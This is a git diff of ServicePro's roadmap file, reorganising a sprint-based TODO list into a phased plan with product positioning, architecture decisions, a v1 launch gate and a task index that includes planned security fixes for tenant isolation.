@@ -1,2438 +1,3325 @@
-# ServicePro - Technical Debt & Future Work
+# ServicePro — Roadmap
 
-This document tracks technical improvements that should be implemented but are deferred for future development cycles.
+**Last Updated**: 2026-10-16 (TODO reformatted from the P0–P3/sprint layout to League Looper's indexed phase format: Task Index with ID/Phase/Category/Hours, one detailed section per open task, a v1 Launch Gate and Verified Complete. A full audit of the repo (backend security, backend correctness, frontend, infra — stored in `docs/audits/2026-10-16/`) is filed as Phases 1–3 (T102–T152, T223–T226). The stack-convergence plan towards League Looper's stack is Phase 4 (T153–T166). Competitive research (`docs/product/competitive-research-2026-10.md`) became product Phases 5–16, merging the open T027–T101 tasks with new T167–T222. Hosting is deferred: ServicePro stays local-only until the production database decision (T202). Old IDs T001–T101 are kept; T011 never existed. Same day: Phase 3 platform work T139–T152 landed — golang-migrate, /version + schema-aware readiness, internal job endpoints, optional Redis, Cloud Run image, LL-style CI/release/hooks, Cloudflare Worker edge (not deployed).)
 
-**Last Updated: 2026-02-16** (T026 implemented — Grafana KPI dashboard with PostgreSQL views)
+> **How to read this file.** Every task has an ID (T###). The **Task Index** lists all of them: completed rows
+> (struck through) first by ID, then open rows by Phase → ID. Each open task has exactly one detailed section under
+> its phase in the **Phase Roadmap** (template: What it is / What it does / Why we need it / Notes). **Phase 0** means
+> work finished before the 2026-10-16 reformat; its history is in **Verified Complete**. The **v1 Launch Gate** is the
+> subset that must be done before real customers. Hours are rough estimates. Audit references like "security audit
+> F-3" or "correctness audit 7.C1" point into `docs/audits/2026-10-16/`. To work a task, see "TODO Task Management"
+> in CLAUDE.md.
+
+## Product framing
+
+- **Positioning**: for small commercial service contractors (1–10 techs) who bill businesses and property managers
+  on terms, ServicePro is the field service platform that gets you paid — scheduling, work orders, multi-site
+  customers and automated collections at one flat monthly price, unlimited users, no contract, and you can leave with
+  all your data any time.
+- **Beachhead**: small commercial/B2B service contractors (1–10 techs) billing on terms — commercial cleaning,
+  property maintenance/handyman for property managers, small commercial HVAC. Secondary hypothesis: inspection and
+  compliance trades (backflow, fire, hood cleaning) — validate by interviews (T218, T222).
+- **Pricing hypothesis**: Solo $39 / Team $99 (unlimited users) / Pro $199, month-to-month; +0.4% platform fee on
+  Stripe Connect volume; founding offer: Team at $59/mo for life for the first 25 tenants (T210).
+- **Moat**: lock-in through money flow (Connect, saved payment methods) plus recurring schedules in an under-served
+  B2B niche, reinforced by a no-contract, easy-exit trust brand that per-seat incumbents can't copy without hurting
+  their revenue. AI is not the moat.
+- Full research: `docs/product/competitive-research-2026-10.md`.
+
+## Status at a glance
+
+- **Local-only.** Not hosted anywhere; the old Fly.io/Pages workflows were replaced (Phase 3, done 2026-10-16) and hosting waits
+  on T202.
+- **Backend has critical tenant-isolation and auth-escalation flaws** (security audit F-1–F-4). Phase 1 blocks any
+  hosting, even invite-only.
+- **Money flows are partially broken** (recording a payment doesn't update the invoice, reminders have never sent,
+  Checkout charges the wrong amount, invoice numbering wedges) — Phase 2.
+- The back office and A/R side is strong for a pre-launch product; the field side, customer-facing side and
+  integrations are thin (Phases 5–11).
+
+## Architecture decisions (recorded 2026-10-16)
+
+1. **D1 — Stay Go API + React (Vite) SPA; not Next.js.** The 95K-line React app is healthy; field service is job-
+   and worker-heavy (reminders, recurring jobs, exports, webhooks), which suits a long-running Go service better than
+   serverless; a technician mobile app needs a standalone API anyway; the broken part is the data layer, which Phase 4
+   rebuilds.
+2. **D2 — Converge on League Looper's stack incrementally (strangler; the app keeps working).** chi; pgx/sqlc;
+   golang-migrate with always-additive migrations; Supabase Auth with our own `users` table keyed by `auth_user_id`;
+   Postgres RLS backstop on `tenant_id`; Resend; Cloudflare R2; Upstash (optional Redis); Sentry; PostHog;
+   Better Stack.
+3. **D3 — Hosting target.** Frontend on Cloudflare Workers static assets with an edge Worker proxying `/api/*` and
+   `/version` to Cloud Run at `servicepro.sharkfins.xyz`; API on Cloud Run; database **undecided** (owner deciding;
+   the Supabase free tier is full with 2 active projects) → local-only until then (T202).
+4. **D4 — Commit convention = League Looper's.** `feat:`/`fix:` are user-facing; `deps`, `chore`, `docs`, `ci`,
+   `build`, `test`, `style`, `refactor`, `perf`, `release` are filtered from release notes. Commits are the changelog;
+   releases are tag-driven from `VERSION` (T146, T148). The historic `minor:`/`major:` prefixes are retired.
+5. **D5 — Tenancy model.** One database, shared schema, `tenant_id` on every tenant-owned row, enforced in
+   repositories (T102, T153) **and** by RLS (T154).
+6. **D6 — Money as decimal (shopspring) today.** Evaluate integer cents during the pgx port (the Travelify rule) —
+   open question OD-5 / T166.
+
+---
+
+## v1 Launch Gate
+
+The minimum subset that must be done before real (paying) customers: **69 tasks, ~418h**. Everything else is post-launch growth or depth. The invite-gated preview (T205) needs only Phase 1 plus T106/T204/T206; the gate below is for opening to paying customers. Phase 4's gating subset is the parts of the stack that touch auth, tenancy, email and storage; the chi and pgx ports are not gating.
+
+| Phase                                                | Gating tasks                                                                                             |
+|------------------------------------------------------|----------------------------------------------------------------------------------------------------------|
+| Phase 1 — Security Remediation                       | **All** — T102, T103, T104, T105, T106, T107, T108, T109, T110, T111, T112, T113, T114, T115, T116, T117 |
+| Phase 2 — Correctness & Cleanup                      | T118, T119, T120, T121, T122, T123, T124, T126, T130, T131, T132, T133, T136, T224, T225                 |
+| Phase 3 — Platform & Delivery                        | ~~T139~~, ~~T140~~, ~~T141~~, ~~T142~~, ~~T143~~, ~~T144~~, ~~T145~~, ~~T146~~, ~~T150~~, ~~T151~~       |
+| Phase 4 — Stack Convergence (LL parity; incremental) | T153, T154, T158, T159, T160                                                                             |
+| Phase 5 — Core Workflow & Quoting                    | T028, T029, T030, T035, T167                                                                             |
+| Phase 6 — Payments to the Business                   | T169, T170, T061, T063                                                                                   |
+| Phase 7 — Dispatch & Field                           | T173, T174, T176                                                                                         |
+| Phase 8 — Customer Communications                    | T048, T049, T050                                                                                         |
+| Phase 9 — Customer Self-Service                      | T183, T081                                                                                               |
+| Phase 10 — Commercial/B2B Wedge                      | T186                                                                                                     |
+| Phase 11 — Integrations & Migration                  | T192, T193                                                                                               |
+| Phase 14 — Hosting & Launch Readiness                | T202, T203, T204, T205, T206, T207, T208, T209, T210, T211, T212, T213                                   |
+| Phase 16 — Go-to-Market                              | T218                                                                                                     |
+
+**Explicitly NOT in the launch gate** (ship without them):
+
+- Phase 2 remainder (T125, T127–T129, T134, T135, T137, T138, T223, T226) — fix soon after launch
+- Phase 3 remainder (T101, T147–T149, T152) — delivery polish
+- Phase 4 ports: Gin → chi (T155), GORM → pgx/sqlc (T156), GORM/sqlite removal (T157), production Redis (T161 — T142 makes Redis optional, which is gated), frontend modernisation (T162–T164), T165, T166
+- Phase 5 remainder (T033, T041, T042, T051, T052, T058, T060, T062, T076, T080, T082, T168)
+- Phase 6: saved methods/autopay (T171), Tap to Pay (T172), late fees (T083)
+- Phase 7 remainder (checklists, time clock, map, offline, store apps, scheduling extras)
+- Phase 8 remainder (templates, delivery tracking, CRM log/timeline, two-way SMS, reviews)
+- Phase 9: customer portal (T184), booking widget (T185)
+- Phase 10 remainder (POs, consolidated invoicing, statements, PM approvals, agreements autopay, collections suite)
+- Phase 11 remainder (Zapier, Wisetack, Gusto, AI receptionist, webhooks, public API)
+- Phases 12, 13 and 15 (reporting, roles/compliance/trust, AI)
+- Phase 16 remainder (T219–T222) — T218 interviews are gated, the marketing build-out is not
 
 ---
 
 ## Task Index
 
-Quick reference for all pending tasks. Use the ID (e.g., "implement T001") to reference a task.
-
-| ID       | Priority | Category          | Confidence | MVP       | Task                                                     |
-| -------- | -------- | ----------------- | ---------- | --------- | -------------------------------------------------------- |
-| ~~T001~~ | ~~P0~~   | ~~Backend~~       | ~~High~~   | ~~--~~    | ~~Recovery middleware Sentry integration~~ ✓             |
-| ~~T002~~ | ~~P0~~   | ~~Frontend~~      | ~~High~~   | ~~--~~    | ~~Centralize direct fetch() calls~~ ✓                    |
-| ~~T003~~ | ~~P0~~   | ~~Frontend~~      | ~~High~~   | ~~--~~    | ~~Add CSP/HSTS headers to nginx.conf~~ ✓                 |
-| ~~T004~~ | ~~P0~~   | ~~Infra~~         | ~~High~~   | ~~--~~    | ~~Create GitHub Actions CI/CD workflows~~ ✓              |
-| ~~T005~~ | ~~P0~~   | ~~Backend~~       | ~~High~~   | ~~--~~    | ~~Expose /metrics endpoint for Prometheus~~ ✓            |
-| ~~T006~~ | ~~P1~~   | ~~Backend~~       | ~~High~~   | ~~--~~    | ~~Structured JSON logging (replace fmt.Printf)~~ ✓       |
-| ~~T007~~ | ~~P1~~   | ~~Frontend~~      | ~~High~~   | ~~--~~    | ~~Fix `any` types (50 instances)~~ ✓                     |
-| ~~T008~~ | ~~P1~~   | ~~Frontend~~      | ~~High~~   | ~~--~~    | ~~Remove @ts-nocheck directives~~ ✓                      |
-| ~~T009~~ | ~~P1~~   | ~~Frontend~~      | ~~High~~   | ~~--~~    | ~~Enable noUnusedLocals/noUnusedParameters~~ ✓           |
-| ~~T010~~ | ~~P1~~   | ~~Backend~~       | ~~High~~   | ~~--~~    | ~~Apply error tracking middleware~~ ✓                    |
-| ~~T012~~ | ~~P1~~   | ~~Infra~~         | ~~High~~   | ~~--~~    | ~~Bundle size monitoring in CI~~ ✓                       |
-| ~~T013~~ | ~~P2~~   | ~~Testing~~       | ~~High~~   | ~~--~~    | ~~Increase frontend test coverage to 70%+~~ ✓            |
-| ~~T014~~ | ~~P2~~   | ~~Testing~~       | ~~High~~   | ~~--~~    | ~~Integration tests for critical workflows~~ ✓           |
-| ~~T015~~ | ~~P2~~   | ~~Docs~~          | ~~High~~   | ~~After~~ | ~~Generate OpenAPI/Swagger documentation~~ ✓             |
-| ~~T016~~ | ~~P2~~   | ~~Perf~~          | ~~High~~   | ~~--~~    | ~~Frontend bundle analysis + optimization~~ ✓            |
-| ~~T017~~ | ~~P2~~   | ~~Perf~~          | ~~High~~   | ~~--~~    | ~~Query performance monitoring~~ ✓                       |
-| ~~T018~~ | ~~P2~~   | ~~Cleanup~~       | ~~High~~   | ~~--~~    | ~~Dead code elimination~~ ✓                              |
-| ~~T019~~ | ~~P0~~   | ~~Scheduling~~    | ~~High~~   | ~~--~~    | ~~Integrate calendar view for job scheduling~~ ✓         |
-| ~~T020~~ | ~~P0~~   | ~~Scheduling~~    | ~~High~~   | ~~--~~    | ~~Build conflict detection API endpoint~~ ✓              |
-| ~~T021~~ | ~~P2~~   | ~~Refactor~~      | ~~High~~   | ~~--~~    | ~~Extract duplicate file download utility~~ ✓            |
-| ~~T022~~ | ~~P2~~   | ~~Refactor~~      | ~~High~~   | ~~--~~    | ~~Extract duplicate URLSearchParams builder~~ ✓          |
-| ~~T023~~ | ~~P2~~   | ~~Refactor~~      | ~~High~~   | ~~--~~    | ~~Consolidate cache hooks (useLocalCache/useSession)~~ ✓ |
-| ~~T024~~ | ~~P1~~   | ~~Observability~~ | ~~High~~   | ~~--~~    | ~~Full Sentry integration (frontend + backend)~~ ✓       |
-| ~~T025~~ | ~~P2~~   | ~~Analytics~~     | ~~High~~   | ~~--~~    | ~~Integrate product analytics (PostHog recommended)~~ ✓  |
-| ~~T026~~ | ~~P2~~   | ~~Analytics~~     | ~~High~~   | ~~--~~    | ~~Set up business KPI dashboard (Grafana)~~ ✓            |
-| T027     | P2       | Scheduling        | High       | Before    | Add drag-and-drop rescheduling to job calendar           |
-| T028     | P0       | Quoting           | High       | Before    | Add "Convert Quote to Job" button                        |
-| T029     | P0       | Invoicing         | High       | Before    | Add "Generate Invoice from Job" button                   |
-| T030     | P0       | Invoicing         | High       | Before    | Auto-populate invoice from job data                      |
-| ~~T031~~ | ~~P0~~   | ~~Invoicing~~     | ~~High~~   | ~~--~~    | ~~Build A/R aging buckets report~~ ✓                     |
-| ~~T032~~ | ~~P0~~   | ~~Invoicing~~     | ~~High~~   | ~~--~~    | ~~Build "Who Owes What" report~~ ✓                       |
-| T033     | P0       | Dashboard         | High       | Before    | Add "Jobs Needing Invoice" dashboard widget              |
-| ~~T034~~ | ~~P0~~   | ~~Comms~~         | ~~High~~   | ~~--~~    | ~~Wire payment reminder automation~~ ✓                   |
-| T035     | P0       | Roles             | High       | Before    | Create Technician role                                   |
-| T036     | P1       | CRM               | High       | Before    | Add manual Call Log entry                                |
-| T037     | P1       | CRM               | High       | Before    | Auto-log system messages to customer activity            |
-| T038     | P1       | Scheduling        | Medium     | Before    | Add technician availability management UI                |
-| T039     | P1       | Scheduling        | Medium     | Before    | Create emergency job insertion workflow                  |
-| T040     | P1       | Scheduling        | High       | Before    | Add auto-notify on emergency insertion                   |
-| T041     | P1       | Quoting           | Medium     | Before    | Implement quote auto follow-ups                          |
-| T042     | P1       | Quoting           | High       | Before    | Build follow-up queue UI                                 |
-| ~~T043~~ | ~~P1~~   | ~~Invoicing~~     | ~~High~~   | ~~--~~    | ~~Wire payment reminder notifications~~ ✓                |
-| T044     | P1       | Invoicing         | Medium     | Before    | Build collections dashboard                              |
-| T045     | P1       | Dashboard         | High       | Before    | Add aging quotes dashboard widget                        |
-| T046     | P1       | Dashboard         | High       | Before    | Add follow-up queue dashboard widget                     |
-| T047     | P1       | Reporting         | Medium     | Before    | Build "stuck work" report                                |
-| T048     | P1       | Comms             | High       | Before    | Add appointment confirmation emails                      |
-| T049     | P1       | Comms             | High       | Before    | Add appointment reminder emails/SMS                      |
-| T050     | P1       | Comms             | High       | Before    | Add "Tech on the way" manual trigger                     |
-| T051     | P1       | Comms             | Medium     | Before    | Implement quote follow-up email sequence                 |
-| T052     | P1       | Roles             | High       | Before    | Create Dispatcher role                                   |
-| ~~T053~~ | ~~P2~~   | ~~CRM~~           | ~~High~~   | ~~--~~    | ~~Add "Repeat Job" button on customer detail~~ ✓         |
-| T054     | P2       | CRM               | Medium     | Before    | Create Communication Log component                       |
-| T055     | P2       | CRM               | Medium     | Before    | Unified Customer Timeline view                           |
-| T056     | P2       | Scheduling        | Medium     | Before    | Add workload capacity warnings                           |
-| T057     | P2       | Scheduling        | High       | Before    | Add double-booking override with reason                  |
-| T058     | P2       | Scheduling        | Medium     | Before    | Add required fields validation by job stage              |
-| T059     | P2       | Scheduling        | High       | Before    | Add technician skill tags                                |
-| T060     | P2       | Quoting           | Medium     | Before    | Create quote template system (good/better/best)          |
-| T061     | P2       | Quoting           | Medium     | Before    | Add required deposit to accept quote                     |
-| T062     | P2       | Quoting           | High       | Before    | Add quote aging tracking                                 |
-| T063     | P2       | Invoicing         | Medium     | Before    | Add deposit tracking and application                     |
-| T064     | P2       | Invoicing         | High       | Before    | Add last contact date tracking on invoices               |
-| T065     | P2       | Invoicing         | High       | Before    | Add promise-to-pay notes                                 |
-| T066     | P2       | Dashboard         | Medium     | Before    | Add technician utilization widget                        |
-| T067     | P2       | Dashboard         | High       | Before    | Add quote conversion rate metric                         |
-| T068     | P2       | Reporting         | High       | Before    | Build job-completion-to-invoice time report              |
-| T069     | P2       | Reporting         | High       | Before    | Build invoice-to-paid time report (DSO)                  |
-| T070     | P2       | Reporting         | High       | Before    | Build revenue by service type report                     |
-| T071     | P2       | Reporting         | High       | Before    | Build collections rate report                            |
-| T072     | P2       | Comms             | High       | Before    | Create message template management UI                    |
-| T073     | P2       | Comms             | High       | Before    | Add rich variable system for templates                   |
-| T074     | P2       | Roles             | High       | Before    | Create Accountant role                                   |
-| T075     | P2       | Roles             | Medium     | Before    | Add field-level permission controls                      |
-| T076     | P3       | CRM               | High       | After     | Add "Recreate Last Quote" button                         |
-| T077     | P3       | Scheduling        | Medium     | After     | Add time-off request UI                                  |
-| T078     | P3       | Scheduling        | Medium     | After     | Add skill-based job matching suggestions                 |
-| T079     | P3       | Scheduling        | High       | After     | Add travel time notes field                              |
-| T080     | P3       | Quoting           | High       | After     | Create terms & conditions templates                      |
-| T081     | P3       | Quoting           | Medium     | After     | Add e-signature for quote acceptance                     |
-| T082     | P3       | Quoting           | Medium     | After     | Add "Create Quote from Job" button                       |
-| T083     | P3       | Invoicing         | Medium     | After     | Implement late fee calculation                           |
-| T084     | P3       | Reporting         | High       | After     | Build quote-to-job conversion report                     |
-| T085     | P3       | Reporting         | Medium     | After     | Build lead-to-quote time report                          |
-| T086     | P3       | Reporting         | High       | After     | Build quote-to-acceptance time report                    |
-| T087     | P3       | Reporting         | Medium     | After     | Build revenue by technician report                       |
-| T088     | P3       | Reporting         | Medium     | After     | Add comparative analysis (vs prior period)               |
-| T089     | P3       | Comms             | Medium     | After     | Add email/SMS delivery tracking                          |
-| T090     | P3       | Comms             | Medium     | After     | Add communication failure alerts                         |
-| T091     | P3       | Comms             | Medium     | After     | Add notification preferences per customer                |
-| T092     | P3       | Roles             | High       | After     | Implement 2FA (TOTP)                                     |
-| T093     | P3       | Roles             | Medium     | After     | Implement comprehensive audit logging                    |
-| T094     | P3       | Roles             | High       | After     | Add Google OAuth sign-in                                 |
-| T095     | P3       | Integration       | Medium     | After     | Build outgoing webhooks system                           |
-| T096     | P3       | Integration       | High       | After     | Build event log table                                    |
-| T097     | P3       | Integration       | High       | After     | Add webhook retry logic                                  |
-| T098     | P3       | Integration       | High       | After     | Document public API (OpenAPI/Swagger)                    |
-| T099     | P1       | Scheduling        | High       | Before    | Add tenant timezone support for conflict detection       |
-| T100     | P1       | Settings          | High       | Before    | Add business hours & timezone to org settings            |
-| T101     | P2       | Observability     | Medium     | After     | Upload source maps to Sentry for production builds       |
-
----
-
-## Sprint Roadmap
-
-### Sprint 1 - Production Readiness (CURRENT)
-
-**Backend Critical:**
-
-- [x] Graceful shutdown with SIGTERM handling ✓
-- [x] HTTP server timeouts (Read/Write/Idle) ✓
-- [x] Apply MaxMultipartMemory to router ✓
-- [x] Apply TrustedProxies to router ✓
-- [x] Deep health checks (DB + Redis) ✓
-- [x] **T001** - Recovery middleware Sentry integration ✓
-
-**Frontend Critical:**
-
-- [x] Fix localStorage token access in ConflictChecker.tsx ✓
-- [x] **T002** - Centralize direct fetch() calls ✓
-- [x] **T003** - Add CSP/HSTS headers to nginx.conf ✓
-
-**Infrastructure:**
-
-- [x] **T004** - Create GitHub Actions CI/CD workflows ✓
-
-### Sprint 2 - Observability & Type Safety
-
-- [x] **T005** - Expose /metrics endpoint for Prometheus ✓
-- [x] **T006** - Structured logging (replace fmt.Printf) ✓
-- [x] **T007** - Fix 50 `any` types in frontend ✓
-- [x] **T008** - Remove @ts-nocheck directives ✓
-- [x] **T009** - Enable noUnusedLocals/noUnusedParameters ✓
-- [x] **T024** - Full Sentry integration (frontend + backend) ✓
-- [x] **T025** - Integrate product analytics (PostHog) ✓
-- [x] **T026** - Set up business KPI dashboard (Grafana) ✓
-
-### Sprint 3 - Testing & Documentation
-
-- [x] **T013** - Increase frontend test coverage to 70%+ ✓
-- [x] **T014** - Integration tests for critical workflows ✓
-- [x] **T015** - Generate OpenAPI/Swagger documentation ✓
-
-### Sprint 4 - Features & Cleanup
-
-- [x] **T019** - Integrate calendar view for job scheduling ✓
-- [x] **T018** - Dead code elimination ✓
-
-### Sprint 5 - Performance & Refactoring
-
-- [x] **T016** - Bundle analysis + optimization ✓
-- [x] **T017** - Query performance monitoring ✓
-- [x] **T021** - Extract duplicate file download utility ✓
-- [x] **T022** - Extract duplicate URLSearchParams builder ✓
-- [x] **T023** - Consolidate cache hooks ✓
-- [x] **T012** - Bundle size monitoring in CI ✓
-
-### Sprint 6 - Scheduling & Conflict Detection
-
-- [x] **T020** - Build conflict detection API endpoint ✓
-- [ ] **T027** - Add drag-and-drop rescheduling to job calendar (depends on T020)
-- [ ] **T038** - Add technician availability management UI
-- [ ] **T056** - Add workload capacity warnings
-- [ ] **T099** - Add tenant timezone support for conflict detection
-- [ ] **T100** - Add business hours & timezone to org settings (T099 depends on this)
-- [ ] **T057** - Add double-booking override with reason
-- [ ] **T059** - Add technician skill tags
-
-### Sprint 7 - Core Workflow (Quote → Job → Invoice)
-
-- [ ] **T028** - Add "Convert Quote to Job" button
-- [ ] **T029** - Add "Generate Invoice from Job" button
-- [ ] **T030** - Auto-populate invoice from job data
-- [ ] **T033** - Add "Jobs Needing Invoice" dashboard widget
-- [x] **T053** - Add "Repeat Job" button on customer detail ✓
-
-### Sprint 8 - Collections & A/R
-
-- [x] **T031** - Build A/R aging buckets report ✓
-- [x] **T032** - Build "Who Owes What" report ✓
-- [x] **T034** - Wire payment reminder automation ✓ (merged with T043)
-- [x] **T043** - Wire payment reminder notifications ✓ (merged with T034)
-- [ ] **T044** - Build collections dashboard
-- [ ] **T064** - Add last contact date tracking on invoices
-- [ ] **T065** - Add promise-to-pay notes
-- [ ] **T071** - Build collections rate report
-
-### Sprint 9 - Quoting Enhancements
-
-- [ ] **T041** - Implement quote auto follow-ups
-- [ ] **T042** - Build follow-up queue UI
-- [ ] **T045** - Add aging quotes dashboard widget
-- [ ] **T046** - Add follow-up queue dashboard widget
-- [ ] **T051** - Implement quote follow-up email sequence
-- [ ] **T060** - Create quote template system (good/better/best)
-- [ ] **T061** - Add required deposit to accept quote
-- [ ] **T062** - Add quote aging tracking
-
-### Sprint 10 - Communications & Notifications
-
-- [ ] **T048** - Add appointment confirmation emails
-- [ ] **T049** - Add appointment reminder emails/SMS
-- [ ] **T050** - Add "Tech on the way" manual trigger
-- [ ] **T072** - Create message template management UI
-- [ ] **T073** - Add rich variable system for templates
-
-### Sprint 11 - Roles & Permissions
-
-- [ ] **T035** - Create Technician role
-- [ ] **T052** - Create Dispatcher role
-- [ ] **T074** - Create Accountant role
-- [ ] **T075** - Add field-level permission controls
-
-### Sprint 12 - CRM & Customer Timeline
-
-- [ ] **T036** - Add manual Call Log entry
-- [ ] **T037** - Auto-log system messages to customer activity
-- [ ] **T054** - Create Communication Log component
-- [ ] **T055** - Unified Customer Timeline view
-
-### Sprint 13 - Dashboard & Reporting
-
-- [ ] **T047** - Build "stuck work" report
-- [ ] **T066** - Add technician utilization widget
-- [ ] **T067** - Add quote conversion rate metric
-- [ ] **T068** - Build job-completion-to-invoice time report
-- [ ] **T069** - Build invoice-to-paid time report (DSO)
-- [ ] **T070** - Build revenue by service type report
-
-### Sprint 14 - Job Workflow Enhancements
-
-- [ ] **T039** - Create emergency job insertion workflow
-- [ ] **T040** - Add auto-notify on emergency insertion
-- [ ] **T058** - Add required fields validation by job stage
-- [ ] **T063** - Add deposit tracking and application
-
-### Sprint 15+ - Post-MVP Enhancements
-
-- [ ] **T076** - Add "Recreate Last Quote" button
-- [ ] **T077** - Add time-off request UI
-- [ ] **T078** - Add skill-based job matching suggestions
-- [ ] **T079** - Add travel time notes field
-- [ ] **T080** - Create terms & conditions templates
-- [ ] **T081** - Add e-signature for quote acceptance
-- [ ] **T082** - Add "Create Quote from Job" button
-- [ ] **T083** - Implement late fee calculation
-- [ ] **T084** - Build quote-to-job conversion report
-- [ ] **T085** - Build lead-to-quote time report
-- [ ] **T086** - Build quote-to-acceptance time report
-- [ ] **T087** - Build revenue by technician report
-- [ ] **T088** - Add comparative analysis (vs prior period)
-- [ ] **T089** - Add email/SMS delivery tracking
-- [ ] **T090** - Add communication failure alerts
-- [ ] **T091** - Add notification preferences per customer
-- [ ] **T092** - Implement 2FA (TOTP)
-- [ ] **T093** - Implement comprehensive audit logging
-- [ ] **T094** - Add Google OAuth sign-in
-- [ ] **T095** - Build outgoing webhooks system
-- [ ] **T096** - Build event log table
-- [ ] **T097** - Add webhook retry logic
-- [ ] **T098** - Document public API (OpenAPI/Swagger)
-- [ ] **T101** - Upload source maps to Sentry for production builds
+| ID       | Phase | Category       | Hours | Task                                                                                                  |
+|----------|-------|----------------|-------|-------------------------------------------------------------------------------------------------------|
+| ~~T001~~ | ~~0~~ | ~~Backend~~    | ~~—~~ | ~~Recovery middleware Sentry integration~~                                                            |
+| ~~T002~~ | ~~0~~ | ~~Frontend~~   | ~~—~~ | ~~Centralize direct fetch() calls~~                                                                   |
+| ~~T003~~ | ~~0~~ | ~~Frontend~~   | ~~—~~ | ~~Add CSP/HSTS headers to nginx.conf~~                                                                |
+| ~~T004~~ | ~~0~~ | ~~CI~~         | ~~—~~ | ~~Create GitHub Actions CI/CD workflows~~                                                             |
+| ~~T005~~ | ~~0~~ | ~~Monitoring~~ | ~~—~~ | ~~Expose /metrics endpoint for Prometheus~~                                                           |
+| ~~T006~~ | ~~0~~ | ~~Backend~~    | ~~—~~ | ~~Structured JSON logging (replace fmt.Printf)~~                                                      |
+| ~~T007~~ | ~~0~~ | ~~Frontend~~   | ~~—~~ | ~~Fix `any` types (50 instances)~~                                                                    |
+| ~~T008~~ | ~~0~~ | ~~Frontend~~   | ~~—~~ | ~~Remove @ts-nocheck directives~~                                                                     |
+| ~~T009~~ | ~~0~~ | ~~Frontend~~   | ~~—~~ | ~~Enable noUnusedLocals/noUnusedParameters~~                                                          |
+| ~~T010~~ | ~~0~~ | ~~Backend~~    | ~~—~~ | ~~Apply error tracking middleware~~                                                                   |
+| ~~T012~~ | ~~0~~ | ~~CI~~         | ~~—~~ | ~~Bundle size monitoring in CI~~                                                                      |
+| ~~T013~~ | ~~0~~ | ~~Testing~~    | ~~—~~ | ~~Increase frontend test coverage to 70%+~~                                                           |
+| ~~T014~~ | ~~0~~ | ~~Testing~~    | ~~—~~ | ~~Integration tests for critical workflows~~                                                          |
+| ~~T015~~ | ~~0~~ | ~~Docs~~       | ~~—~~ | ~~Generate OpenAPI/Swagger documentation~~                                                            |
+| ~~T016~~ | ~~0~~ | ~~Perf~~       | ~~—~~ | ~~Frontend bundle analysis + optimization~~                                                           |
+| ~~T017~~ | ~~0~~ | ~~Perf~~       | ~~—~~ | ~~Query performance monitoring~~                                                                      |
+| ~~T018~~ | ~~0~~ | ~~Cleanup~~    | ~~—~~ | ~~Dead code elimination~~                                                                             |
+| ~~T019~~ | ~~0~~ | ~~Feature~~    | ~~—~~ | ~~Integrate calendar view for job scheduling~~                                                        |
+| ~~T020~~ | ~~0~~ | ~~Feature~~    | ~~—~~ | ~~Build conflict detection API endpoint~~                                                             |
+| ~~T021~~ | ~~0~~ | ~~Cleanup~~    | ~~—~~ | ~~Extract duplicate file download utility~~                                                           |
+| ~~T022~~ | ~~0~~ | ~~Cleanup~~    | ~~—~~ | ~~Extract duplicate URLSearchParams builder~~                                                         |
+| ~~T023~~ | ~~0~~ | ~~Cleanup~~    | ~~—~~ | ~~Consolidate cache hooks (useLocalCache/useSession)~~                                                |
+| ~~T024~~ | ~~0~~ | ~~Monitoring~~ | ~~—~~ | ~~Full Sentry integration (frontend + backend)~~                                                      |
+| ~~T025~~ | ~~0~~ | ~~Monitoring~~ | ~~—~~ | ~~Integrate product analytics (PostHog)~~                                                             |
+| ~~T026~~ | ~~0~~ | ~~Reporting~~  | ~~—~~ | ~~Set up business KPI dashboard (Grafana)~~                                                           |
+| ~~T031~~ | ~~0~~ | ~~Reporting~~  | ~~—~~ | ~~Build A/R aging buckets report~~                                                                    |
+| ~~T032~~ | ~~0~~ | ~~Reporting~~  | ~~—~~ | ~~Build "Who Owes What" report~~                                                                      |
+| ~~T034~~ | ~~0~~ | ~~Email~~      | ~~—~~ | ~~Wire payment reminder automation~~                                                                  |
+| ~~T043~~ | ~~0~~ | ~~Email~~      | ~~—~~ | ~~Wire payment reminder notifications~~                                                               |
+| ~~T053~~ | ~~0~~ | ~~Feature~~    | ~~—~~ | ~~Add "Repeat Job" button on customer detail~~                                                        |
+| ~~T100~~ | ~~0~~ | ~~Feature~~    | ~~—~~ | ~~Add business hours & timezone to org settings~~                                                     |
+| ~~T139~~ | ~~3~~ | ~~DB~~         | ~~4~~ | ~~golang-migrate baseline (000001), cmd/migrate, dev-only startup migrations~~                        |
+| ~~T140~~ | ~~3~~ | ~~Backend~~    | ~~2~~ | ~~/version endpoint and schema-aware readiness~~                                                      |
+| ~~T141~~ | ~~3~~ | ~~Backend~~    | ~~4~~ | ~~Background tickers → internal job endpoints + scheduled-jobs workflow~~                             |
+| ~~T142~~ | ~~3~~ | ~~Backend~~    | ~~2~~ | ~~Redis optional at boot~~                                                                            |
+| ~~T143~~ | ~~3~~ | ~~Infra~~      | ~~2~~ | ~~Cloud Run-ready Dockerfile and .dockerignore~~                                                      |
+| ~~T144~~ | ~~3~~ | ~~DB~~         | ~~1~~ | ~~DB pool sizing and pooler (simple protocol) support~~                                               |
+| ~~T145~~ | ~~3~~ | ~~CI~~         | ~~6~~ | ~~CI rewrite: lint, tests with Postgres+Redis, govulncheck, OpenAPI drift, frontend, Docker + Trivy~~ |
+| ~~T146~~ | ~~3~~ | ~~Deploy~~     | ~~5~~ | ~~Tag-driven release-deploy pipeline, VERSION scripts and RELEASING.md~~                              |
+| ~~T147~~ | ~~3~~ | ~~CI~~         | ~~2~~ | ~~Dependabot deps() prefixes, automerge and weekly security scan~~                                    |
+| ~~T148~~ | ~~3~~ | ~~CI~~         | ~~2~~ | ~~Versioned bash git hooks replace python pre-commit; commit-msg prefix contract~~                    |
+| ~~T149~~ | ~~3~~ | ~~Cleanup~~    | ~~2~~ | ~~Repo hygiene: tracked artifacts, Fly/nginx/cliff removal, .gitignore, single Makefile~~             |
+| ~~T150~~ | ~~3~~ | ~~Deploy~~     | ~~6~~ | ~~Cloudflare Workers static assets + /api edge proxy Worker + _headers~~                              |
+| ~~T151~~ | ~~3~~ | ~~Docs~~       | ~~3~~ | ~~Ops docs: Cloud Run setup, deploy/rollback, backups + nightly pg_dump → R2 workflow~~               |
+| ~~T152~~ | ~~3~~ | ~~CI~~         | ~~1~~ | ~~Commit generated OpenAPI and TS types for drift gating~~                                            |
+| T102     | 1     | Security       | 16    | Tenant-scope all business data                                                                        |
+| T103     | 1     | Security       | 6     | Authorize tenant member, invitation and role endpoints; no self-escalation                            |
+| T104     | 1     | Security       | 4     | Evaluate permissions per tenant                                                                       |
